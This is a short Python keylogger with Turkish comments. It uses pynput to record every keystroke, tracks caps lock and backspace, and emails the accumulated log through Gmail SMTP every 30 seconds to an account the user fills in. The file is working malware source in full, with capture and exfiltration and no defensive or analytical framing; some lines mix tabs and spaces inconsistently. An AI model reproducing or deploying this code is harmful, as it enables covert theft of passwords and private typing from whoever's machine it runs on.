import pynput.keyboard
import smtplib
import threading
capslock=0
log="" #globalde boş bir string oluşturduk.
Mail_hesabi= "" #Buraya Mail gönderme işleminde kullanacağınız mail ve şifreyi girmelisiniz. 
Sifre=""

def call_back(key):
    global log #globaldeki log'a ve capslock'a eriştik.
    global capslock
    

    try:
        log = log + str(key.char) #Boş stringe her seferinde klavyeden girilen karakteri ekledik.

    except AttributeError:
        if key==key.space: #Eğer kullanıcı boşluğa basarsa logun içine bir space'lik değer ekliyoruz
            log=log + " "

        elif key==key.backspace: #Eğer kullanıcı Backspace yani silme tuşuna basarsa Logun içindeki veriden sonuncuyu elemanı çıkarıyoruz
            log = log[:-1]

        elif key==key.caps_lock: #Kullanıcının Capslock'unun açık olup olmama durumu kontrol ediyoruz.
            capslock=capslock+1
            if(capslock % 2 == 1):
                log=log+"CapsLock acık"
            if(capslock % 2 == 0):
                log=log+"CapsLock kapalı"
        else:
            log=log+str(key) 

    except:
        pass

    print(log)

def send_mail(sendermail,passwd,message):

            email_server=smtplib.SMTP("smtp.gmail.com",587)
            email_server.ehlo()
            email_server.starttls()
            email_server.login(sendermail,passwd)
            email_server.sendmail(sendermail,sendermail,message)
            email_server.quit()



def thread_func():
	
	global Mail_hesabi
	global Sifre	
    global log
    send_mail(Mail_hesabi,Sifre,log.encode("utf-8"))
    log=""
    zamanlayici=threading.Timer(30,thread_func)
    zamanlayici.start()



key_logger_dinleyici=pynput.keyboard.Listener(on_press=call_back)


with key_logger_dinleyici:
     thread_func()
     key_logger_dinleyici.join()


